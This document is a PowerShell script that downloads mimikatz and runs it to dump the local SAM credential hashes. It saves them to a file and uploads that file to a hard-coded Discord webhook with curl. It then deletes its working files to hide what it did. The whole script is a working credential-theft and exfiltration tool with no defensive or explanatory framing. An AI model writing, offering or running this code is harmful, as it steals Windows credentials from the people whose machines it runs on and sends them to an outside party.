# Define the path to the mimikatz executable
$mimikatzPath = "$env:TEMP\mimikatz.exe"

# Download mimikatz if not already present
if (-Not (Test-Path $mimikatzPath)) {
    Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
    Expand-Archive -Path "$env:TEMP\mimikatz.zip" -DestinationPath "$env:TEMP\mimikatz"
    Copy-Item -Path "$env:TEMP\mimikatz\mimikatz_trunk\x64\mimikatz.exe" -Destination $mimikatzPath
}

# Create a mimikatz command script
$mimikatzCommand = @"
privilege::debug
log $env:TEMP\mimikatz.log
lsadump::sam
log
exit
"@

# Write the command to a file
$mimikatzCommandPath = "$env:TEMP\mimikatz_command.txt"
$mimikatzCommand | Out-File -FilePath $mimikatzCommandPath

# Run mimikatz with the command script
Start-Process -FilePath $mimikatzPath -ArgumentList "privilege::debug", "lsadump::sam" -Wait -NoNewWindow

# Read the output log
$mimikatzLogPath = "$env:TEMP\mimikatz.log"
$mimikatzOutput = Get-Content -Path $mimikatzLogPath

# Save the output to a file
$outputPath = "$env:TEMP\windows_credentials.txt"
$mimikatzOutput | Out-File -FilePath $outputPath

# Upload the file to Discord
$webhookUrl = "https://discordapp.com/api/webhooks/1163648209806180373/1a4UKrWxReg-ICzIMM-Q3Pt14l02wOnM3MUdb4LU6RHs_DlGiFjzq_K0jpFB_yFUDP2R"
$curlCmd = "curl.exe -F `file1=@$outputPath` $webhookUrl"
Invoke-Expression -Command $curlCmd

# Clean up
Remove-Item -Path $mimikatzCommandPath
Remove-Item -Path $mimikatzLogPath
Remove-Item -Path $outputPath
